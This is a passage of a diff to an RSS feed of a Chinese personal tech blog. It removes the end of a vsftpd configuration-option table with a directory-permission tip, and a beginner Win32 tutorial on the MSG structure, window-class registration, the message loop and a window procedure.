-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否允许本地系统用户登录&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;write_enable&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否开启任何形式的 &lt;code&gt;FTP&lt;/code&gt; 写入命令，上传文件&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;local_umask&lt;/td&gt;
-        &lt;td&gt;xxx&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;本地用户的 &lt;code&gt;umask&lt;/code&gt; 设置，如果注释该设置则默认为 &lt;code&gt;077&lt;/code&gt;，但一般都设置成 &lt;code&gt;022&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;anon_upload_enable&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否允许匿名用户上传文件，如果要设置为允许，则需要先开启 &lt;code&gt;write_enable&lt;/code&gt;，否则无效，此外对应目录还要具有写权限&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;anon_mkdir_write_enable&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否允许匿名用户创建新目录&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;dirmessage_enable&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;当进入某个目录时，发送信息提示给远程用户&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;xferlog_enable&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否开启 上传/下载 的日志记录&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;connect_from_port_20&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否使用 &lt;code&gt;20&lt;/code&gt; 端口来连接 &lt;code&gt;FTP&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;chown_uploads&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;匿名上传的文件是否由某一指定用户 &lt;code&gt;chown_username&lt;/code&gt; 所有&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;chown_username&lt;/td&gt;
-        &lt;td&gt;有效用户名&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;匿名上传的文件由该设定用户所有&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;xferlog_file&lt;/td&gt;
-        &lt;td&gt;有效路径&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;设置日志文件的保存位置，默认为 &lt;code&gt;/var/log/xferlog&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;xferlog_std_format&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否使用标准的 &lt;code&gt;ftpd xferlog&lt;/code&gt;日志格式，该格式日志默认保存在 &lt;code&gt;/var/log/xferlog&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;idle_session_timeout&lt;/td&gt;
-        &lt;td&gt;数值&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;设置空闲连接的超时时间，单位 秒&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;data_connection_timeout&lt;/td&gt;
-        &lt;td&gt;数值&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;设置等待数据传输的最大时间，单位 秒（&lt;code&gt;data_connection_timeout&lt;/code&gt; 与 &lt;code&gt;idle_session_timeout&lt;/code&gt;
-            在同一时间只有一个有效）
-        &lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;nopriv_user&lt;/td&gt;
-        &lt;td&gt;有效用户名&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;指定一个非特权用户，用于运行 &lt;code&gt;vsftpd&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;async_abor_enable&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否支持异步 &lt;code&gt;ABOR&lt;/code&gt; 请求&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;ascii_upload_enable&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否开启 &lt;code&gt;ASCII&lt;/code&gt; 模式进行文件上传，一般不开启&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;ascii_download_enable&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否开启 &lt;code&gt;ASCII&lt;/code&gt; 模式进行文件下载，一般不开启&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;ftpd_banner&lt;/td&gt;
-        &lt;td&gt;…&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;自定义登录标语&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;deny_email_enable&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;如果匿名登录，则会要求输入 email 地址，如果不希望一些 email 地址具有登录权限，则可以开启此项，并在 &lt;code&gt;banned_email_file&lt;/code&gt;
-            指定的文件中写入对应的 email 地址
-        &lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;banned_email_file&lt;/td&gt;
-        &lt;td&gt;有效文件&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;当开启 &lt;code&gt;deny_email_enable&lt;/code&gt; 时，需要通过此项指定一个保存登录无效 email 的文件&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;chroot_local_user&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否将所有用户限制在主目录，当为 &lt;code&gt;NO&lt;/code&gt; 时， &lt;code&gt;FTP&lt;/code&gt; 用户可以切换到其他目录&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;chroot_list_enable&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否启用限制用户的名单列表&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;chroot_list_file&lt;/td&gt;
-        &lt;td&gt;有效文件&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;用户列表，其作用与 &lt;code&gt;chroot_local_user&lt;/code&gt; 和 &lt;code&gt;chroot_local_user&lt;/code&gt; 的组合有关，详见下表&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;allow_writeable_chroot&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否允许用户对 ftp 根目录具有写权限，如果设置成不允许而目录实际上却具备写权限，则会报错&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;ls_recurse_enable&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否允许 &lt;code&gt;ls -R&lt;/code&gt; 指令来递归查询，递归查询比较耗资源&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;listen&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;如果为 &lt;code&gt;YES&lt;/code&gt;，&lt;code&gt;vsftpd&lt;/code&gt; 将以独立模式运行并监听 &lt;code&gt;IPv4&lt;/code&gt; 的套接字，处理相关连接请求（该指令不能与
-            &lt;code&gt;listen_ipv6&lt;/code&gt; 一起使用）
-        &lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;listen_ipv6&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否允许监听 &lt;code&gt;IPv6&lt;/code&gt; 套接字&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;pam_service_name&lt;/td&gt;
-        &lt;td&gt;…&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;设置 &lt;code&gt;PAM&lt;/code&gt; 外挂模块提供的认证服务所使用的配置文件名 ，即 &lt;code&gt;/etc/pam.d/vsftpd&lt;/code&gt; 文件，此文件中 &lt;code&gt;file=/etc/vsftpd/ftpusers&lt;/code&gt;
-            字段，说明了 &lt;code&gt;PAM&lt;/code&gt; 模块能抵挡的帐号内容来自文件 &lt;code&gt;/etc/vsftpd/ftpusers&lt;/code&gt; 中
-        &lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;userlist_enable&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否启用 &lt;code&gt;user_list&lt;/code&gt; 文件来控制用户登录&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;userlist_deny&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否拒绝 &lt;code&gt;user_list&lt;/code&gt; 中的用户登录，此属性设置需在 &lt;code&gt;userlist_enable = YES&lt;/code&gt; 时才有效&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;tcp_wrappers&lt;/td&gt;
-        &lt;td&gt;&lt;code&gt;YES&lt;/code&gt;/&lt;code&gt;NO&lt;/code&gt;&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;是否使用 &lt;code&gt;tcp_wrappers&lt;/code&gt; 作为主机访问控制方式&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;max_clients&lt;/td&gt;
-        &lt;td&gt;数值&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;同一时间允许的最大连接数&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;max_per_ip&lt;/td&gt;
-        &lt;td&gt;数值&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;同一个IP客户端连接的最大值&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;local_root&lt;/td&gt;
-        &lt;td&gt;有效目录&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;系统用户登录后的根目录&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;anon_root&lt;/td&gt;
-        &lt;td&gt;有效目录&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;匿名用户登录后的根目录&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-        &lt;td&gt;user_config_dir&lt;/td&gt;
-        &lt;td&gt;有效目录&lt;/td&gt;
-        &lt;td align=&#34;left&#34;&gt;用户单独配置文件存放目录，该目录下用户的文件名就是对应用户名&lt;/td&gt;
-    &lt;/tr&gt;
-&lt;/table&gt;
-&lt;h2 id=&#34;以上搞完之后还要把ftp目录的权限给更改&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#以上搞完之后还要把ftp目录的权限给更改&#34;&gt;#&lt;/a&gt; 以上搞完之后还要把 ftp 目录的权限给更改&lt;/h2&gt;
-&lt;p&gt;&lt;code&gt;chmod 777 /var/ftp/pub&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;这里只能更改 ftp 目录下的子目录的权限。这就是个坑，当更改 /etc/ftp/ 这个目录的权限时，都没法登陆这个 ftp 服务器了。&lt;br /&gt;
-当然是可以更改 ftp 下的目录的，在 vsftpd.config 中配置。&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://self-ferry.github.io/2021/03/30/win32%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BA%8B%E4%BB%B6%E6%B6%88%E6%81%AF/</guid>
-            <title>win32（二）事件消息</title>
-            <link>https://self-ferry.github.io/2021/03/30/win32%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BA%8B%E4%BB%B6%E6%B6%88%E6%81%AF/</link>
-            <category term="Win32编程" scheme="https://self-ferry.github.io/categories/Win32%E7%BC%96%E7%A8%8B/" />
-            <category term="widows" scheme="https://self-ferry.github.io/tags/widows/" />
-            <pubDate>Tue, 30 Mar 2021 22:32:27 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;事件-消息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#事件-消息&#34;&gt;#&lt;/a&gt; 事件 消息&lt;/h1&gt;
-&lt;p&gt;Windows 中的事件是一个 &amp;quot;动作&amp;quot;，这个动作可能是用户操作应用程序产生的，也可能是 Windows 自己产生的.&lt;/p&gt;
-&lt;p&gt;而消息，就是用来描述这些 &amp;quot;动作&amp;quot; 的，比如：&lt;/p&gt;
-&lt;p&gt;这个动作是什么时候产生的？&lt;/p&gt;
-&lt;p&gt;哪个应用程序产生的？&lt;/p&gt;
-&lt;p&gt;在什么位置产生的？&lt;br /&gt;
-等等。。。&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;label&#34;&gt;事件驱动消息，消息封装事件&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;Windows 为了能够准确的描述这些信息，提供了一个结构体：MSG，该结构体里面记录的事件的详细信息.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;typedef struct tagMSG &amp;#123;    
-
-HWND hwnd;     // 窗口句柄
-
-UINT message;     //消息类型
-
-WPARAM wParam;     // 对消息类型进一步描述
-
-LPARAM lParam;     //同上
-
-DWORD time;     // 动作发生时间
-
-POINT pt;     //坐标，结构体封装了，内部是x，y
-
-&amp;#125; MSG, *PMSG;     
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;说明：&lt;/p&gt;
-&lt;p&gt;1、hwnd：&lt;/p&gt;
-&lt;p&gt;表示消息所属的窗口&lt;/p&gt;
-&lt;p&gt;一个消息一般都是与某个窗口相关联的&lt;/p&gt;
-&lt;p&gt;在 Windows 中 HWND 类型的变量通常用来标识窗口。&lt;/p&gt;
-&lt;p&gt;2、message&lt;/p&gt;
-&lt;p&gt;在 Windows 中，消息是由一个数值来表示的&lt;/p&gt;
-&lt;p&gt;但是由于数值不便于记忆，所以 Windows 将消息对应的数值定义为 WM_XXX 宏（WM == Window Message）&lt;/p&gt;
-&lt;p&gt;鼠标左键按下 WM_LBUTTONDOWN        键盘按下 WM_KEYDOWN&lt;/p&gt;
-&lt;p&gt;3、wParam 和 lParam&lt;/p&gt;
-&lt;p&gt;32 位消息的特定附加信息，具体表示什么处决于 message&lt;/p&gt;
-&lt;p&gt;4、time&lt;/p&gt;
-&lt;p&gt;消息创建时的时间&lt;/p&gt;
-&lt;p&gt;5、消息创建时的鼠标位置&lt;/p&gt;
-&lt;p&gt;具体来说：如下图，用户输入后，封装成消息，加入系统的消息队列，然后应用程序那还有队列&lt;/p&gt;
-&lt;p&gt;用来存储自己的消息队列，所以系统队列到应用程序队列是分流而治的过程。&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;从队列中取出消息，使用的是循环机制，就是不停的取出消息，而后面的判断消息类型是不是我们关心的意思其实是&lt;/p&gt;
-&lt;p&gt;我们是否写了该消息下的响应函数，或者说回调函数。&lt;/p&gt;
-&lt;p&gt;具体流程如下图：&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;image002.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;h1 id=&#34;创建一个窗口程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建一个窗口程序&#34;&gt;#&lt;/a&gt; 创建一个窗口程序&lt;/h1&gt;
-&lt;p&gt;步骤 1：创建 Windows 应用程序 选择空项目&lt;/p&gt;
-&lt;p&gt;步骤 2：在新建项窗口中选 C++ 代码文件 创建一个新的 cpp 文件&lt;/p&gt;
-&lt;p&gt;步骤 3：在新的 cpp 文件中添加: &lt;code&gt;#include &amp;lt;Windows.h&amp;gt;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;并添加入口函数：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int CALLBACK WinMain(                 CALLBACK 是一个宏             
-
-_In_ HINSTANCE hInstance,         #define CALLBACK __stdcall    
-
-_In_ HINSTANCE hPrevInstance,     
-
-_In_ LPSTR lpCmdLine,                 
-
-_In_ int nCmdShow             
-
-)                     所有的Win32 API函数都遵循该约定    
-
-&amp;#123;                     
-
-return 0;             
-
-&amp;#125;                     
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;步骤 4：设计窗口类&lt;/p&gt;
-&lt;p&gt;代码：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;
-//窗口的类名    
-
-TCHAR className[] = &amp;quot;My First Window&amp;quot;;     
-
-// 创建窗口类的对象     
-
-WNDCLASS wndclass = &amp;#123;0&amp;#125;;        //一定要先将所有值赋值    
-
-wndclass.hbrBackground = (HBRUSH)COLOR_MENU;        //窗口的背景色    
-
-wndclass.lpfnWndProc = WindowProc;        //窗口过程函数    
-
-wndclass.lpszClassName = className;        //窗口类的名字    
-
-wndclass.hInstance = hInstance;        //定义窗口类的应用程序的实例句柄    
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;步骤 5：注册窗口类    ，这是什么？哈哈哈，就是把结构体赋值后传参调用。&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;RegisterClass(&amp;amp;wndclass);     
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;步骤 6：创建窗口&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// 创建窗口     
-
-HWND hwnd = CreateWindow(     
-
-className,        //类名    
-
-TEXT(&amp;quot;我的第一个窗口&amp;quot;),        //窗口标题    
-
-WS_OVERLAPPEDWINDOW,        //窗口外观样式     
-
-10,        //相对于父窗口的X坐标    
-
-10,        //相对于父窗口的Y坐标    
-
-600,        //窗口的宽度     
-
-300,        //窗口的高度     
-
-NULL,        //父窗口句柄，为NULL     
-
-NULL,        //菜单句柄，为NULL     
-
-hInstance,        //当前应用程序的句柄     
-
-NULL);        //附加数据一般为NULL    
-
-if(hwnd == NULL)        //是否创建成功     
-
-return 0;     
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;步骤 7：显示窗口&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// 显示窗口     
-
-ShowWindow(hwnd, SW_SHOW);     
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;步骤 8：消息循环&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;MSG msg;     
-
-while(GetMessage(&amp;amp;msg, NULL, 0, 0))     
-
-&amp;#123;     
-
-TranslateMessage(&amp;amp;msg);     
-
-DispatchMessage(&amp;amp;msg);     
-
-&amp;#125;     
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;步骤 9：回调函数&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;/*                        
-
-窗口消息处理程序 窗口回调函数：            
-
-1、窗口回调函数处理过的消息，必须传回0.        
-
-2、窗口回调不处理的消息，由DefWindowProc来处理.    
-
-*/                        
-
-LRESULT CALLBACK WindowProc(         
-
-IN HWND hwnd,     
-
-IN UINT uMsg,     
-
-IN WPARAM wParam,     
-
-IN LPARAM lParam     
-
-)     
-
-&amp;#123;     
-
-switch(uMsg)    
-
-&amp;#123;    
-
-//窗口消息    
-
-case WM_CREATE:     
-
-&amp;#123;    
-
-DbgPrintf(&amp;quot;WM_CREATE %d %d\n&amp;quot;,wParam,lParam);    
-
-CREATESTRUCT* createst = (CREATESTRUCT*)lParam;    
-
-DbgPrintf(&amp;quot;CREATESTRUCT %s\n&amp;quot;,createst-&amp;gt;lpszClass);    
-
-return 0;    
-
-&amp;#125;    
-
-case WM_MOVE:    
-
-&amp;#123;    
-
-DbgPrintf(&amp;quot;WM_MOVE %d %d\n&amp;quot;,wParam,lParam);    
-
-POINTS points = MAKEPOINTS(lParam);    
-
-DbgPrintf(&amp;quot;X Y %d %d\n&amp;quot;,points.x,points.y);    
-
-return 0;    
-
-&amp;#125;    
-
-case WM_SIZE:    
-
-&amp;#123;    
-
-DbgPrintf(&amp;quot;WM_SIZE %d %d\n&amp;quot;,wParam,lParam);    
-
-int newWidth = (int)(short) LOWORD(lParam);     
-
-int newHeight = (int)(short) HIWORD(lParam);     
-
-DbgPrintf(&amp;quot;WM_SIZE %d %d\n&amp;quot;,newWidth,newHeight);    
-
-return 0;    
-
-&amp;#125;    
-
-case WM_DESTROY:    //销毁
-
-&amp;#123;    
-
-DbgPrintf(&amp;quot;WM_DESTROY %d %d\n&amp;quot;,wParam,lParam);    
-
-PostQuitMessage(0);    
-
-return 0;    
-
-&amp;#125;    
-
-//键盘消息    
-
-case WM_KEYUP:    
-
-&amp;#123;    
-
-DbgPrintf(&amp;quot;WM_KEYUP %d %d\n&amp;quot;,wParam,lParam);    
-
-return 0;    
-
-&amp;#125;    
-
-case WM_KEYDOWN:    
-
-&amp;#123;    
-
-DbgPrintf(&amp;quot;WM_KEYDOWN %d %d\n&amp;quot;,wParam,lParam);    
-
-return 0;    
-
-&amp;#125;    
-
-//鼠标消息    
-
-case WM_LBUTTONDOWN:    
-
-&amp;#123;    
-
-DbgPrintf(&amp;quot;WM_LBUTTONDOWN %d %d\n&amp;quot;,wParam,lParam);    
-
-POINTS points = MAKEPOINTS(lParam);    
-
-DbgPrintf(&amp;quot;WM_LBUTTONDOWN %d %d\n&amp;quot;,points.x,points.y);    
-
-return 0;    
-
-&amp;#125;    
-
-&amp;#125;    
-
-return DefWindowProc(hwnd,uMsg,wParam,lParam);    //扔给windows处理其他消息
-
-&amp;#125;     
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;MFC 就是基于此封装&lt;/p&gt;
-&lt;h1 id=&#34;reference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reference&#34;&gt;#&lt;/a&gt; Reference&lt;/h1&gt;
-&lt;p&gt;滴水逆向课件&lt;/p&gt;
  ]]></description>
         </item>
     </channel>
